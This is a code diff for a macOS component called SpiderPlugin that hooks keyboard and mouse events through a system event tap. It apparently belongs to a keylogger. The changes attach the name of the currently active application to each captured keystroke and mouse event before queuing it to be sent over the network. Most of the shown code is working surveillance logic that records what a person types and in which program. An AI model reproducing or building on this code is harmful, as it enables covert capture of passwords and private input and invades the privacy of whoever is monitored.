@@ -257,6 +257,13 @@ namespace spider
           CGPoint eventPoint = CGEventGetLocation(eventRef);
           msg.sys.event.posX = static_cast<std::uint32_t>(eventPoint.x);
           msg.sys.event.posY = static_cast<std::uint32_t>(eventPoint.y);
+          NSDictionary *activeApp = [[NSWorkspace sharedWorkspace] activeApplication];
+
+          NSString *str = [activeApp objectForKey:@"NSApplicationName"];
+          std::string cur = std::string([str UTF8String]);
+          extractPath(cur);
+          std::copy(cur.begin(), cur.end(), msg.sys.currentWindow.data());
+
           SpiderPlugin::m_sendToNetwork->push(msg);
         }
 
@@ -283,6 +290,7 @@ namespace spider
       CGEventRef SpiderPlugin::treatKeyboardEvent(CGEventTapProxy, CGEventType type,
           CGEventRef eventRef, void *)
       {
+        bool send = false;
         CGKeyCode virtualKey = static_cast<CGKeyCode>(CGEventGetIntegerValueField(eventRef, kCGKeyboardEventKeycode));
         spider::client::SystemMsg msg;
         msg.sys.type = spider::client::SystemMsgType::EventKeyboard;
@@ -303,9 +311,11 @@ namespace spider
         {
           case kCGEventKeyDown:
             msg.sys.event.state = SystemMsgEventState::Down;
+            send = true;
             break;
           case kCGEventKeyUp:
             msg.sys.event.state = SystemMsgEventState::Up;
+            send = true;
             break;
           default:
             break;
@@ -313,7 +323,16 @@ namespace spider
 #if defined __clang__
 #pragma clang diagnostic pop
 #endif
-        SpiderPlugin::m_sendToNetwork->push(msg);
+        if (send)
+        {
+            NSDictionary *activeApp = [[NSWorkspace sharedWorkspace] activeApplication];
+
+            NSString *str = [activeApp objectForKey:@"NSApplicationName"];
+            std::string cur = std::string([str UTF8String]);
+            extractPath(cur);
+            std::copy(cur.begin(), cur.end(), msg.sys.currentWindow.data());
+            SpiderPlugin::m_sendToNetwork->push(msg);
+        }
         return (eventRef);
       }
 
